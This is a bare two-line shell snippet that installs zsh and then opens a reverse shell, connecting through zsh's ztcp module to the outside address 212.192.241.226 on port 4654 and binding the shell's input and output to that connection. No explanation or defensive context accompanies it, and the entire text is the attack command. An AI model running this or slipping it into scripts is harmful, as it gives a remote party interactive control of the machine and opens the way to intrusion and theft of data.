sudo apt install zsh
zsh -c 'zmodload zsh/net/tcp && ztcp 212.192.241.226 4654 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
